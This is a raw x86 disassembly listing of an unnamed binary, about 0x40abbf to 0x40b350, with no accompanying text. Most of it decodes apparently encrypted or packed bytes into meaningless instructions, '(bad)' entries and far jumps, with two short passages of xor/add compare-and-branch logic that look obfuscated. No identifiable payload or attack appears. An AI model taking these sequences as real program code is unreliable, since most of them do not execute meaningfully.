  40abbf:	push   ebx
  40abc0:	pusha  
  40abc1:	push   cs
  40abc2:	sub    bl,cl
  40abc4:	pop    ebx
  40abc5:	fs jb  0x40aba4
  40abc8:	jne    0x40ab53
  40abca:	leave  
  40abcb:	dec    ebx
  40abcc:	xchg   esp,eax
  40abcd:	cdq    
  40abce:	hlt    
  40abcf:	sub    BYTE PTR [ebx+0x27],al
  40abd2:	(bad)  
  40abd3:	rcr    DWORD PTR [ecx-0x38fc4369],cl
  40abd9:	adc    DWORD PTR [eax+0x4e],ecx
  40abdc:	mov    eax,ds:0x20566838
  40abe1:	sbb    al,0x1d
  40abe3:	add    ebp,DWORD PTR [ebx]
  40abe5:	call   0xf4ba:0x3e38508f
  40abec:	pop    eax
  40abed:	jae    0x40aba6
  40abef:	mov    ds:0x415e79dc,eax
  40abf4:	in     eax,0xb7
  40abf6:	xchg   ebx,eax
  40abf7:	test   esi,ebp
  40abf9:	popa   
  40abfa:	ret    
  40abfb:	ds hlt 
  40abfd:	(bad)  
  40abff:	cmp    ah,ah
  40ac01:	mov    esp,0xf6be9eb4
  40ac06:	mov    ebp,0x3f3fc606
  40ac0b:	mov    esi,0x376fb99f
  40ac10:	push   edi
  40ac11:	xor    BYTE PTR [edi+0x1490bcf7],0x80
  40ac18:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ac19:	inc    esi
  40ac1a:	in     al,0x45
  40ac1c:	jl     0x40ac03
  40ac1e:	jmp    0x40c6:0x2adb1314
  40ac25:	stos   DWORD PTR es:[edi],eax
  40ac26:	cdq    
  40ac27:	and    bh,dl
  40ac29:	retf   
  40ac2a:	adc    eax,0xdb000b87
  40ac2f:	(bad)  
  40ac31:	push   ss
  40ac32:	repz cwde 
  40ac34:	pop    eax
  40ac35:	lea    ecx,[eax+0x2e]
  40ac38:	retf   
  40ac39:	push   ebp
  40ac3a:	aaa    
  40ac3b:	sar    DWORD PTR ds:0xdc68f478,1
  40ac41:	or     esi,DWORD PTR [esi+0x7c6ad331]
  40ac47:	sbb    edi,DWORD PTR [edx-0x38]
  40ac4a:	ficomp DWORD PTR [ecx-0x7]
  40ac4d:	pop    esi
  40ac4e:	sub    DWORD PTR [ebp+0x22273688],edx
  40ac54:	cwde   
  40ac55:	xor    dl,0x78
  40ac58:	pop    esi
  40ac59:	loope  0x40acca
  40ac5b:	neg    DWORD PTR [esi]
  40ac5d:	rol    DWORD PTR [eax+0xc116128],cl
  40ac63:	out    dx,al
  40ac64:	or     ecx,DWORD PTR [ebx]
  40ac66:	cmp    DWORD PTR [edx-0x20be0fbd],esi
  40ac6c:	ja     0x40acd3
  40ac6e:	xchg   ebp,eax
  40ac6f:	sbb    al,0x48
  40ac71:	out    0xd8,eax
  40ac73:	iret   
  40ac74:	push   ss
  40ac75:	into   
  40ac76:	fwait
  40ac77:	or     BYTE PTR [ebx-0x57],dh
  40ac7a:	aas    
  40ac7b:	adc    BYTE PTR [esi-0x5ad8c167],cl
  40ac81:	sub    ebx,ebp
  40ac83:	shr    edx,cl
  40ac85:	std    
  40ac86:	sub    eax,0x7a6c64b8
  40ac8b:	sti    
  40ac8c:	fwait
  40ac8d:	push   ds
  40ac8e:	out    0x58,eax
  40ac90:	mov    bh,0xd8
  40ac92:	xor    DWORD PTR [edi+0x30],esp
  40ac95:	push   ss
  40ac96:	cwde   
  40ac97:	int3   
  40ac98:	mov    ebx,0xc84e6753
  40ac9d:	inc    esp
  40ac9e:	jg     0x40ac90
  40aca0:	lods   eax,DWORD PTR ds:[esi]
  40aca1:	scas   eax,DWORD PTR es:[edi]
  40aca2:	fdivr  DWORD PTR [ebp+0x20]
  40aca5:	inc    ebx
  40aca6:	fiadd  DWORD PTR [edi]
  40aca8:	push   DWORD PTR [esi]
  40acaa:	dec    esp
  40acab:	mov    dh,0x5d
  40acad:	pop    ebx
  40acae:	hlt    
  40acaf:	out    0x4,eax
  40acb1:	cdq    
  40acb2:	in     al,dx
  40acb3:	std    
  40acb4:	jmp    0x4b80:0x700c42e5
  40acbb:	clc    
  40acbc:	push   0x5fcc2984
  40acc1:	loopne 0x40ac97
  40acc3:	in     al,dx
  40acc4:	xchg   BYTE PTR [eax],cl
  40acc6:	sbb    eax,0x7734e850
  40accb:	call   0xa323:0x722eee2b
  40acd2:	jge    0x40ad29
  40acd4:	rol    DWORD PTR [esi-0x6],cl
  40acd7:	mov    bh,0x9d
  40acd9:	fcomp  QWORD PTR [eax-0x7]
  40acdc:	test   al,0x10
  40acde:	sub    eax,0xde72e452
  40ace3:	and    eax,0xc797e088
  40ace8:	push   eax
  40ace9:	je     0x40acf6
  40aceb:	call   0x5beb:0x49461640
  40acf2:	shl    DWORD PTR [ecx-0x5c],0xdb
  40acf6:	jg     0x40ad2e
  40acf8:	add    BYTE PTR [edi+0x72c23f9a],ch
  40acfe:	outs   dx,DWORD PTR ds:[esi]
  40acff:	call   0xa84a:0x882d4379
  40ad06:	lahf   
  40ad07:	push   0xffffffc5
  40ad09:	pop    edi
  40ad0a:	test   edi,edx
  40ad0c:	cld    
  40ad0d:	mov    bh,0xe5
  40ad0f:	pushf  
  40ad10:	push   esi
  40ad11:	lock cmp al,0x57
  40ad14:	cdq    
  40ad15:	cdq    
  40ad16:	std    
  40ad17:	add    eax,0xd89d0dd2
  40ad1c:	mov    ah,0xee
  40ad1e:	enter  0x508d,0x6
  40ad22:	mov    ch,0x80
  40ad24:	cmp    DWORD PTR [esi],esp
  40ad26:	pop    ss
  40ad27:	adc    DWORD PTR [edx+ecx*4-0x78],0xffffffb9
  40ad2c:	xor    DWORD PTR [esi],edi
  40ad2e:	mov    bh,0xe9
  40ad30:	xor    BYTE PTR [edi+0x6f],0x25
  40ad34:	sub    eax,0x83081261
  40ad39:	add    eax,ecx
  40ad3b:	mov    ecx,DWORD PTR [ebp-0x8]
  40ad3e:	mov    ecx,DWORD PTR [ecx]
  40ad40:	mov    eax,DWORD PTR [eax+ecx*1]
  40ad43:	mov    DWORD PTR [ebp-0x1c],eax
  40ad46:	mov    eax,DWORD PTR [ebp+0x8]
  40ad49:	xor    eax,esi
  40ad4b:	add    eax,edi
  40ad4d:	mov    DWORD PTR [ebp-0x20],eax
  40ad50:	mov    eax,DWORD PTR [ebp+0x8]
  40ad53:	mov    ecx,DWORD PTR [ebp-0x1c]
  40ad56:	xor    eax,esi
  40ad58:	add    eax,edi
  40ad5a:	cmp    ecx,eax
  40ad5c:	je     0x40c082
  40ad62:	mov    eax,DWORD PTR [ebp-0x8]
  40ad65:	mov    ecx,DWORD PTR [ebp-0x1c]
  40ad68:	add    ecx,DWORD PTR [eax]
  40ad6a:	mov    DWORD PTR [ebp-0x20],ecx
  40ad6d:	jmp    0x40b08e
  40ad72:	adc    edx,esi
  40ad74:	inc    ebx
  40ad75:	sahf   
  40ad76:	popa   
  40ad77:	scas   eax,DWORD PTR es:[edi]
  40ad78:	icebp  
  40ad79:	jno    0x40adf2
  40ad7b:	ficomp WORD PTR [edi+0x3af9c1c7]
  40ad81:	and    eax,0x7e7ef300
  40ad86:	jp     0x40ae05
  40ad88:	jle    0x40ae08
  40ad8a:	mov    ebp,gs
  40ad8c:	pop    ebp
  40ad8d:	push   0x4752da13
  40ad92:	push   ecx
  40ad93:	adc    BYTE PTR [ebx-0x552a37dd],ah
  40ad99:	nop
  40ad9a:	lods   eax,DWORD PTR ds:[esi]
  40ad9b:	pusha  
  40ad9c:	neg    DWORD PTR ds:0xbe2b45a1
  40ada2:	clc    
  40ada3:	cmp    eax,0xf368ac1
  40ada8:	or     ch,BYTE PTR [esp+edx*8+0x24]
  40adac:	jns    0x40adc4
  40adae:	mov    eax,0xef0771e8
  40adb3:	xchg   ebx,eax
  40adb4:	sbb    al,0x2d
  40adb6:	(bad)  [eax-0x1]
  40adb9:	clc    
  40adba:	mov    ecx,0xefb7613e
  40adbf:	push   cs
  40adc0:	int3   
  40adc1:	pop    eax
  40adc2:	lock mov al,0x1d
  40adc5:	cmp    al,0x84
  40adc7:	(bad)  
  40adc8:	fucomip st,st(2)
  40adca:	dec    edi
  40adcb:	cmp    eax,0xe359bd0e
  40add0:	cli    
  40add1:	inc    ecx
  40add2:	mov    eax,0xe39ae421
  40add7:	mov    edi,0xc798df9f
  40addc:	jno    0x40ae36
  40adde:	pop    edi
  40addf:	push   es
  40ade0:	es call 0x5132:0xca9a522a
  40ade8:	mov    ch,0xce
  40adea:	cmp    cl,cl
  40adec:	lds    ebx,FWORD PTR [eax+0x5]
  40adef:	fimul  WORD PTR [ebp-0x4c3871e]
  40adf5:	data16 adc dh,bh
  40adf8:	push   eax
  40adf9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40adfa:	or     dl,BYTE PTR [ebp-0x6482a375]
  40ae00:	xor    DWORD PTR [eax+0x1e],ebp
  40ae03:	mov    eax,ds:0xfedadde6
  40ae08:	stos   BYTE PTR es:[edi],al
  40ae09:	mov    ds:0x6e2251b,eax
  40ae0e:	or     ebx,DWORD PTR es:[edx]
  40ae11:	out    dx,al
  40ae12:	lahf   
  40ae13:	int3   
  40ae14:	into   
  40ae15:	daa    
  40ae16:	xor    BYTE PTR [edx+0x2844ff68],bl
  40ae1c:	sub    ah,bl
  40ae1e:	and    dh,BYTE PTR [ebp-0x55]
  40ae21:	push   esi
  40ae22:	pop    ecx
  40ae23:	jmp    0x40ae37
  40ae25:	out    dx,eax
  40ae26:	popf   
  40ae27:	sub    esi,edi
  40ae29:	mov    gs,WORD PTR [eax+0x23d349a5]
  40ae2f:	cli    
  40ae30:	test   al,0x6a
  40ae32:	mov    edi,0x4e43f9e8
  40ae37:	push   edx
  40ae38:	outs   dx,DWORD PTR ds:[esi]
  40ae39:	stos   DWORD PTR es:[edi],eax
  40ae3a:	aam    0xa9
  40ae3c:	add    al,0x84
  40ae3e:	pop    edx
  40ae3f:	xlat   BYTE PTR ds:[ebx]
  40ae40:	mov    WORD PTR [ebp-0x32],ss
  40ae43:	lea    esi,[ebx+0x3f3bddcb]
  40ae49:	jl     0x40ae14
  40ae4b:	dec    ecx
  40ae4c:	shl    ebx,cl
  40ae4e:	sti    
  40ae4f:	(bad)
  40ae52:	xor    DWORD PTR [ecx+0x59b3666e],ebp
  40ae58:	cmovg  edx,ebx
  40ae5b:	push   0x33413e96
  40ae60:	sub    al,0xb1
  40ae62:	lahf   
  40ae63:	or     dh,0xad
  40ae66:	idiv   BYTE PTR [edi+0x3e4b5f4d]
  40ae6c:	out    dx,eax
  40ae6d:	pop    ds
  40ae6e:	add    DWORD PTR [ebp-0x329e69a],edx
  40ae74:	sbb    eax,0x53fd8f65
  40ae79:	xchg   esi,eax
  40ae7a:	in     al,0xd1
  40ae7c:	arpl   WORD PTR [esi-0x4f7995d4],si
  40ae82:	dec    esi
  40ae83:	push   ds
  40ae84:	(bad)  
  40ae85:	jg     0x40aea5
  40ae87:	dec    edi
  40ae88:	imul   ebx,DWORD PTR [edx-0x1f20ac90],0x48
  40ae8f:	fnsave [edx+0x3559d33]
  40ae95:	mov    ds:0x405ff6b1,al
  40ae9a:	iret   
  40ae9b:	xchg   esp,eax
  40ae9c:	imul   eax,DWORD PTR [ecx+0x69],0xac178f6d
  40aea3:	(bad)  
  40aea4:	hlt    
  40aea5:	cmp    al,0xa2
  40aea7:	cdq    
  40aea8:	fmulp  st(2),st
  40aeaa:	icebp  
  40aeab:	std    
  40aeac:	pop    esi
  40aead:	xor    eax,0x531884fc
  40aeb2:	ja     0x40ae5f
  40aeb4:	cmc    
  40aeb5:	out    0xd1,al
  40aeb7:	mov    edi,DWORD PTR [ebx]
  40aeb9:	push   ecx
  40aeba:	jle    0x40aebf
  40aebc:	lea    edi,[ebp+0x5d1ade9e]
  40aec2:	jle    0x40aebe
  40aec4:	push   esi
  40aec5:	xor    eax,0xd5549ae4
  40aeca:	mov    bl,0xd1
  40aecc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aecd:	inc    edx
  40aece:	popf   
  40aecf:	mov    esp,0xcd31da4d
  40aed4:	repnz adc al,BYTE PTR cs:[ebp-0x4c42f18]
  40aedc:	dec    esi
  40aedd:	push   ebp
  40aede:	mov    eax,ds:0xa4ecfe34
  40aee3:	js     0x40ae8b
  40aee5:	or     DWORD PTR [ebp+0x31],ebx
  40aee8:	das    
  40aee9:	dec    eax
  40aeea:	clc    
  40aeeb:	imul   edi,ebp,0xc68584b1
  40aef1:	inc    edi
  40aef2:	cmp    eax,DWORD PTR [ebx+esi*8]
  40aef5:	jmp    0x40af44
  40aef7:	sub    eax,0x6ebbacc8
  40aefc:	xor    edx,DWORD PTR [edi]
  40aefe:	adc    ebx,ebx
  40af00:	or     ebx,DWORD PTR [eax+0xc6cb1e1]
  40af06:	xchg   esi,eax
  40af07:	pop    ss
  40af08:	inc    eax
  40af09:	mul    BYTE PTR [ebp-0x696365bd]
  40af0f:	adc    ebp,DWORD PTR [esi+ecx*1+0x508627ea]
  40af16:	mov    eax,0xd77ab6c
  40af1b:	jnp    0x40af09
  40af1d:	mov    al,BYTE PTR [ebx-0x35344652]
  40af23:	ret    0xac77
  40af26:	retf   
  40af27:	outs   dx,DWORD PTR ds:[esi]
  40af28:	xor    DWORD PTR [ecx],edi
  40af2a:	mov    eax,ds:0xc1a8a3f1
  40af2f:	xchg   edx,eax
  40af30:	fwait
  40af31:	sti    
  40af32:	inc    ebx
  40af33:	or     dl,BYTE PTR [esi-0x7d7e380]
  40af39:	scas   eax,DWORD PTR es:[edi]
  40af3a:	fidivr DWORD PTR [ebp-0x45]
  40af3d:	aas    
  40af3e:	xchg   ebx,eax
  40af3f:	mov    bh,0x5d
  40af41:	push   eax
  40af42:	ret    
  40af43:	inc    ebp
  40af44:	mov    eax,ds:0x57117ff
  40af49:	fidivr DWORD PTR [edi+0x7c768532]
  40af4f:	nop    DWORD PTR [eax+0x4949278f]
  40af56:	pop    ecx
  40af57:	paddd  mm1,QWORD PTR [edx]
  40af5a:	cmp    al,0xe2
  40af5c:	xlat   BYTE PTR ds:[ebx]
  40af5d:	pop    edx
  40af5e:	daa    
  40af5f:	scas   eax,DWORD PTR es:[edi]
  40af60:	test   BYTE PTR [edx],dl
  40af62:	xor    eax,0xfe20c31b
  40af67:	ds ds xchg esp,eax
  40af6a:	xor    al,0xb1
  40af6c:	or     bh,BYTE PTR [ebx+0x5678fd2c]
  40af72:	mov    esi,ebp
  40af74:	jmp    0x1f77:0xf4c960cb
  40af7b:	add    DWORD PTR [ecx+0x1],ecx
  40af7e:	mov    bh,0xd3
  40af80:	or     bl,cl
  40af82:	mov    ds:0x8483da7f,eax
  40af87:	sbb    al,0x1f
  40af89:	sub    ecx,DWORD PTR [eax+0x6ac67d7]
  40af8f:	add    BYTE PTR [esi-0x31],0x4a
  40af93:	sbb    dh,BYTE PTR [eax+eax*2-0x2f]
  40af97:	fcom   QWORD PTR [esi]
  40af99:	test   eax,0x2f7f85e7
  40af9e:	add    eax,DWORD PTR [ebx]
  40afa0:	or     al,0x76
  40afa2:	push   0x5b64ef5d
  40afa7:	stc    
  40afa8:	or     DWORD PTR [esi+esi*8],esi
  40afab:	mov    ecx,0x53ba9ffe
  40afb0:	fadd   DWORD PTR [ecx]
  40afb2:	jns    0x40afb8
  40afb4:	mov    edi,0x88b4dc79
  40afb9:	sub    bh,BYTE PTR [esi+0x741fd106]
  40afbf:	xchg   edi,eax
  40afc0:	sub    DWORD PTR [edx-0x50],edi
  40afc3:	xchg   edx,eax
  40afc4:	xchg   ebp,eax
  40afc5:	mov    bl,0x2b
  40afc7:	xchg   ecx,eax
  40afc8:	push   eax
  40afc9:	pop    eax
  40afca:	cmp    dl,al
  40afcc:	add    DWORD PTR [eax-0x66],ebx
  40afcf:	pusha  
  40afd0:	cs es jp 0x40af84
  40afd4:	pop    es
  40afd5:	adc    DWORD PTR [ebp-0x51],ebx
  40afd8:	pop    esp
  40afd9:	shl    DWORD PTR [esi+0x66cef427],cl
  40afdf:	stc    
  40afe0:	test   BYTE PTR [ecx+edx*2],ah
  40afe3:	popf   
  40afe4:	cwde   
  40afe5:	inc    edx
  40afe6:	imul   edx,DWORD PTR [ebx],0x92611e53
  40afec:	pop    ebp
  40afed:	sar    DWORD PTR [esi-0x64fd181d],cl
  40aff3:	mov    ecx,eax
  40aff5:	call   ebx
  40aff7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aff8:	mov    eax,0x39a985e4
  40affd:	dec    edx
  40affe:	or     eax,DWORD PTR [esi-0x21]
  40b001:	stc    
  40b002:	stc    
  40b003:	adc    al,0x6c
  40b005:	add    BYTE PTR [ecx+0x66],bh
  40b008:	dec    ah
  40b00a:	xchg   BYTE PTR [eax+0x28393817],cl
  40b010:	xchg   ebp,eax
  40b011:	test   DWORD PTR [ebx],ebx
  40b013:	and    dh,BYTE PTR [ecx+0x39]
  40b016:	lods   eax,DWORD PTR ds:[esi]
  40b017:	or     DWORD PTR [eax],esi
  40b019:	or     ah,al
  40b01b:	push   cs
  40b01c:	cmp    ebx,DWORD PTR [edi-0x71]
  40b01f:	sar    BYTE PTR [esi-0x7f4aacf9],cl
  40b025:	xor    eax,DWORD PTR [edx+0x194cf792]
  40b02b:	std    
  40b02c:	xlat   BYTE PTR ds:[ebx]
  40b02d:	xchg   edi,eax
  40b02e:	inc    ebp
  40b02f:	xchg   ebx,eax
  40b030:	xchg   esi,eax
  40b031:	xchg   esp,eax
  40b032:	lods   al,BYTE PTR ds:[esi]
  40b033:	xchg   ebp,eax
  40b034:	adc    ah,BYTE PTR [esi+0x3f026835]
  40b03a:	stc    
  40b03b:	push   esp
  40b03c:	fwait
  40b03d:	nop
  40b03e:	inc    edx
  40b03f:	sar    ebp,1
  40b041:	push   edx
  40b042:	jmp    0x257a:0xdd81c33a
  40b049:	bound  eax,QWORD PTR [edx-0x69]
  40b04c:	in     al,0x31
  40b04e:	test   BYTE PTR [ebx-0x36],bh
  40b051:	arpl   WORD PTR [ebx*2+0x2179dfab],ax
  40b058:	xor    DWORD PTR [edx+0x2],esp
  40b05b:	and    al,0x2
  40b05d:	jg     0x40b06b
  40b05f:	jmp    0x1657:0x145d9a28
  40b066:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b067:	aaa    
  40b068:	sbb    edi,DWORD PTR [ebp+0x60]
  40b06b:	ror    BYTE PTR [esp+eiz*8],0xb0
  40b06f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b070:	fild   QWORD PTR [esi-0x42]
  40b073:	jae    0x40b019
  40b075:	or     al,0x55
  40b077:	call   0xff89c68a
  40b07c:	scas   al,BYTE PTR es:[edi]
  40b07d:	stos   BYTE PTR es:[edi],al
  40b07e:	jge    0x40b03d
  40b080:	push   edi
  40b081:	jne    0x40b022
  40b083:	nop/reserved BYTE PTR [esi]
  40b086:	xor    eax,0x10ee6134
  40b08b:	imul   ebp,DWORD PTR [edi-0xe],0x8be0458b
  40b092:	dec    ebp
  40b093:	clc    
  40b094:	mov    eax,DWORD PTR [eax+0xc]
  40b097:	mov    ecx,DWORD PTR [ecx]
  40b099:	mov    al,BYTE PTR [eax+ecx*1]
  40b09c:	add    al,0x38
  40b09e:	xor    al,0x46
  40b0a0:	cmp    al,0xc5
  40b0a2:	je     0x40b6fb
  40b0a8:	jmp    0x40b3c9
  40b0ad:	sar    DWORD PTR [ecx],1
  40b0af:	mov    cl,0xa4
  40b0b1:	mov    cl,0x74
  40b0b3:	shr    DWORD PTR [ecx+0x55],1
  40b0b6:	fsubr  DWORD PTR [eax+0x37]
  40b0b9:	sbb    BYTE PTR [ecx-0x1f3c90a],0x7e
  40b0c0:	jle    0x40b13c
  40b0c2:	jge    0x40b142
  40b0c4:	jle    0x40b11f
  40b0c6:	in     eax,0xe2
  40b0c8:	mov    WORD PTR [ebx+0xe082d1c],es
  40b0ce:	jb     0x40b13e
  40b0d0:	fiadd  WORD PTR [edx]
  40b0d2:	adc    BYTE PTR [ecx],bl
  40b0d4:	xchg   edx,eax
  40b0d5:	loope  0x40b0b1
  40b0d7:	sbb    bl,bl
  40b0d9:	shr    DWORD PTR [esi],1
  40b0db:	jbe    0x40b082
  40b0dd:	adc    eax,0xfd3798bb
  40b0e2:	cmp    ebx,esp
  40b0e4:	shr    DWORD PTR [ebx],0x66
  40b0e7:	pop    edi
  40b0e8:	xchg   edx,eax
  40b0e9:	push   0xa262a988
  40b0ee:	add    al,0x4e
  40b0f0:	icebp  
  40b0f1:	ins    DWORD PTR es:[edi],dx
  40b0f2:	cmp    esp,DWORD PTR [edi]
  40b0f4:	jne    0x40b16d
  40b0f6:	mov    ah,0x4c
  40b0f8:	jle    0x40b0d7
  40b0fa:	add    ecx,esi
  40b0fc:	ror    esi,cl
  40b0fe:	test   DWORD PTR [eax-0x2f837814],edx
  40b104:	cwde   
  40b105:	pushf  
  40b106:	fwait
  40b107:	outs   dx,BYTE PTR ds:[esi]
  40b108:	(bad)  
  40b109:	mov    ds:0x59744f30,al
  40b10e:	jne    0x40b111
  40b110:	jmp    0x7038715a
  40b115:	mov    eax,ds:0x39d0deeb
  40b11a:	sub    eax,0xd4cdf580
  40b11f:	call   0xe130:0xde72ec36
  40b126:	cmc    
  40b127:	mov    ch,0xec
  40b129:	outs   dx,DWORD PTR ds:[esi]
  40b12a:	jo     0x40b0f6
  40b12c:	call   0xe740:0x93776ca7
  40b133:	mov    WORD PTR [esi],gs
  40b135:	cld    
  40b136:	retf   
  40b137:	mov    dl,0x1a
  40b139:	stc    
  40b13a:	sti    
  40b13b:	je     0x40b0bd
  40b13d:	(bad)  
  40b13e:	jecxz  0x40b168
  40b140:	jne    0x40b121
  40b142:	rcl    WORD PTR [ebx],cl
  40b145:	sub    al,0xc3
  40b147:	test   al,0xf1
  40b149:	sbb    bl,bh
  40b14b:	in     eax,0x70
  40b14d:	(bad)  [ecx-0x74bd1870]
  40b153:	and    BYTE PTR [esi],bl
  40b155:	outs   dx,BYTE PTR ds:[esi]
  40b156:	xchg   ebp,eax
  40b157:	leave  
  40b158:	push   0xfb4353f0
  40b15d:	push   0xffffffc6
  40b15f:	imul   ecx,DWORD PTR ds:0x59802a4a,0xa410985
  40b169:	push   edi
  40b16a:	mov    ch,0x83
  40b16c:	jbe    0x40b127
  40b16e:	enter  0xda08,0x69
  40b172:	daa    
  40b173:	cmp    BYTE PTR [eax+0x59],cl
  40b176:	jle    0x40b12c
  40b178:	test   DWORD PTR [edx+edi*2+0x5a10619a],esp
  40b17f:	inc    ebx
  40b180:	xor    DWORD PTR ds:0xc1fc0e21,ecx
  40b186:	or     DWORD PTR [ebx],0x7f63255c
  40b18c:	inc    edx
  40b18d:	or     BYTE PTR [eax+0x66],ah
  40b190:	xor    DWORD PTR [edi+0xf],edx
  40b193:	paddusb mm4,QWORD PTR ds:0xd911ab32
  40b19a:	fs scas al,BYTE PTR es:[edi]
  40b19c:	ja     0x40b1e3
  40b19e:	imul   edx,DWORD PTR ds:0x27d11a18,0x5
  40b1a5:	cs popa 
  40b1a7:	jno    0x40b132
  40b1a9:	push   cs
  40b1aa:	sub    esp,edx
  40b1ac:	add    edi,esi
  40b1ae:	jns    0x40b1ff
  40b1b0:	sbb    al,0x2c
  40b1b2:	push   ecx
  40b1b3:	and    ch,BYTE PTR [esi+0x15a69aec]
  40b1b9:	in     eax,dx
  40b1ba:	fs call 0x46840459
  40b1c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b1c1:	xlat   BYTE PTR ds:[ebx]
  40b1c2:	cwde   
  40b1c3:	lds    edx,FWORD PTR [ebx]
  40b1c5:	adc    eax,0x9a4c5e16
  40b1ca:	cmp    DWORD PTR [eax],ecx
  40b1cc:	(bad)  
  40b1ce:	mov    ?,WORD PTR [eax+0x70f9ad91]
  40b1d4:	cld    
  40b1d5:	test   al,0xa2
  40b1d7:	adc    DWORD PTR [eax],0x7c
  40b1da:	imul   edx,DWORD PTR [ecx+0x5],0x45
  40b1de:	xchg   ecx,eax
  40b1df:	xchg   esp,eax
  40b1e0:	xchg   esp,eax
  40b1e1:	mov    BYTE PTR [esi],bl
  40b1e3:	out    0x85,eax
  40b1e5:	loope  0x40b180
  40b1e7:	sahf   
  40b1e8:	out    dx,al
  40b1e9:	out    0x57,eax
  40b1eb:	or     ecx,0xf7d788bd
  40b1f1:	push   cs
  40b1f2:	pop    ebp
  40b1f3:	fisubr WORD PTR [ebx-0x1b]
  40b1f6:	jne    0x40b211
  40b1f8:	hlt    
  40b1f9:	data16 jle 0x40b259
  40b1fc:	pop    edx
  40b1fd:	dec    ebp
  40b1fe:	(bad)  
  40b1ff:	es into 
  40b201:	mov    edi,DWORD PTR [ebp+0x310f9c8a]
  40b207:	(bad)  
  40b208:	or     ecx,DWORD PTR [ecx+0x33]
  40b20b:	sbb    esi,edx
  40b20d:	in     al,0x59
  40b20f:	je     0x40b19f
  40b211:	sbb    BYTE PTR [ebx],dh
  40b213:	ror    bh,1
  40b215:	cmp    DWORD PTR [ecx-0x46],ebx
  40b218:	xchg   ecx,eax
  40b219:	inc    eax
  40b21a:	or     ebp,DWORD PTR [edi+0x338c6180]
  40b220:	jmp    0x6ae4e20a
  40b225:	fwait
  40b226:	add    eax,esi
  40b228:	sub    al,BYTE PTR [esi]
  40b22a:	dec    esi
  40b22b:	hlt    
  40b22c:	add    ch,BYTE PTR [eax+0x5a2a7dc0]
  40b232:	(bad)  
  40b233:	or     eax,DWORD PTR [edi-0x69]
  40b236:	(bad)  
  40b237:	fdivp  st(7),st
  40b239:	push   ds
  40b23a:	outs   dx,BYTE PTR ds:[esi]
  40b23b:	add    al,0x2c
  40b23d:	je     0x40b2a1
  40b23f:	scas   al,BYTE PTR es:[edi]
  40b240:	fldcw  WORD PTR [ebx+0x77]
  40b243:	dec    ebx
  40b244:	fucomip st,st(3)
  40b246:	mov    ah,0x11
  40b248:	adc    al,0x67
  40b24a:	mov    bl,0x17
  40b24c:	jmp    0xd38dbbe5
  40b251:	push   ebp
  40b252:	lahf   
  40b253:	rol    ecx,0xc3
  40b256:	pop    eax
  40b257:	je     0x40b29b
  40b259:	int    0x60
  40b25b:	mov    al,ds:0xe35c7529
  40b260:	jae    0x40b1e6
  40b262:	repnz mov ecx,0xee1fe4c8
  40b268:	cmp    DWORD PTR ds:0x7bb27fb0,ecx
  40b26e:	mov    ch,0xbb
  40b270:	(bad)
  40b273:	jbe    0x40b20f
  40b275:	pop    esi
  40b276:	jb     0x40b2ec
  40b278:	lods   al,BYTE PTR ds:[esi]
  40b279:	sahf   
  40b27a:	popa   
  40b27b:	sub    cl,0xce
  40b27e:	mov    ebx,0x6e2e70ab
  40b283:	popf   
  40b284:	fistp  WORD PTR [edx-0x1c70eb3f]
  40b28a:	inc    ebx
  40b28b:	mov    edx,0x511d2f07
  40b290:	not    edi
  40b292:	fnstsw WORD PTR [ecx+0x7a]
  40b295:	sti    
  40b296:	cdq    
  40b297:	xor    al,0x9a
  40b299:	cmp    eax,0x7481f983
  40b29e:	test   eax,0x9294cf93
  40b2a3:	out    0xca,al
  40b2a5:	inc    eax
  40b2a6:	lahf   
  40b2a7:	dec    ebp
  40b2a8:	aad    0x38
  40b2aa:	push   ecx
  40b2ab:	(bad)  
  40b2ad:	dec    ecx
  40b2ae:	ret    0x2dd7
  40b2b1:	xor    DWORD PTR [ebp+0x7a],ebp
  40b2b4:	stos   DWORD PTR es:[edi],eax
  40b2b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b2b6:	or     DWORD PTR [ebp+ebx*2-0x45],esi
  40b2ba:	pop    edx
  40b2bb:	cmp    DWORD PTR [eax-0x1e],eax
  40b2be:	int3   
  40b2bf:	or     ch,BYTE PTR [esi+0x4cd5b3d7]
  40b2c5:	ret    
  40b2c6:	not    BYTE PTR [edi-0x50e88c8a]
  40b2cc:	bswap  ecx
  40b2ce:	gs stos BYTE PTR es:[edi],al
  40b2d0:	xor    BYTE PTR [ebp+0x4a],bh
  40b2d3:	mov    cl,0x2a
  40b2d5:	fnstcw WORD PTR [eax]
  40b2d7:	jmp    0xf6b0caae
  40b2dc:	je     0x40b2c5
  40b2de:	aaa    
  40b2df:	psubsb mm6,QWORD PTR [edx+0x5e]
  40b2e3:	mov    ebp,0x853e517a
  40b2e8:	mov    ebp,0xc4cf05b8
  40b2ed:	pop    ebx
  40b2ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b2ef:	cmp    cl,BYTE PTR [edi-0x6]
  40b2f2:	test   eax,0x3dca08f4
  40b2f7:	clc    
  40b2f8:	mov    cl,dl
  40b2fa:	cmp    al,0xe3
  40b2fc:	xor    BYTE PTR [ebx+0x54d37fd2],ch
  40b302:	out    0xa,eax
  40b304:	enter  0x90c8,0x6d
  40b308:	mov    ebx,0x96a8f9e
  40b30d:	fxch   st(4)
  40b30f:	adc    edi,DWORD PTR [edi+0x46]
  40b312:	loop   0x40b35f
  40b314:	dec    eax
  40b315:	popa   
  40b316:	inc    esi
  40b317:	xchg   ebx,eax
  40b318:	imul   ebx,DWORD PTR [esi-0x75],0xf6c73e44
  40b31f:	push   ebx
  40b320:	xchg   ebp,eax
  40b321:	call   0x8dbe:0x4182dd59
  40b328:	nop
  40b329:	jmp    0x1162:0xe1f4458a
  40b330:	(bad)  
  40b331:	sbb    eax,0x47dd7359
  40b336:	mov    WORD PTR [esi-0x1c],ss
  40b339:	enterw 0xf7a6,0x20
  40b33e:	aas    
  40b33f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b340:	adc    BYTE PTR [edi+0xc6f0ed9],0x80
  40b347:	dec    edi
  40b348:	push   cs
  40b349:	jmp    0xba98db52
  40b34e:	adc    edx,ebp
  40b350:	or     bh,ch
